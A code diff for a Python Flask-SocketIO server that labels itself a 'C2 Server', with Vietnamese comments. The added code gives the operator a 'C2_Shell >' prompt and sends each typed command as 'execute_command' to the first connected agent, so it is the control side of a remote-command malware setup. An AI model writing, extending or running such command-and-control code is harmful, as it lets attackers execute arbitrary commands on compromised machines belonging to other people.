@@ -1,5 +1,7 @@
 from flask import Flask, request
 from flask_socketio import SocketIO, emit
+import threading
+import time
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!' 
@@ -43,6 +45,30 @@ def handle_command_result(data):
     print(f"[*] received result from [{agent_id}]:")
     print(result)
 
+def cmd_interface():
+    while True:
+        cmd = input("C2_Shell > ")
+        if cmd == 'exit':
+            break
+            
+        if agents:
+            # lay id cua agent dau tien trong danh sach
+            target_id = list(agents.keys())[0]
+            
+            # lay sid tuong ung tu dictionary agents
+            target_sid = agents[target_id]["sid"]
+            
+            # gui lenh di voi tham so room
+            socketio.emit('execute_command', {'cmd': cmd}, room=target_sid)
+            print(f"[*] sent command to {target_id}")
+        else:
+            print("[!] no agents connected yet.")
+
 if __name__ == '__main__':
+    # khoi tao luong nhap lieu
+    t = threading.Thread(target=cmd_interface)
+    t.start()
+
     print("[*] Starting C2 Server with WebSockets...")
-    socketio.run(app, port=80, debug=True)
+    socketio.run(app, port=80, debug=False)
+    #debug=False de tranh xung dot voi thread input
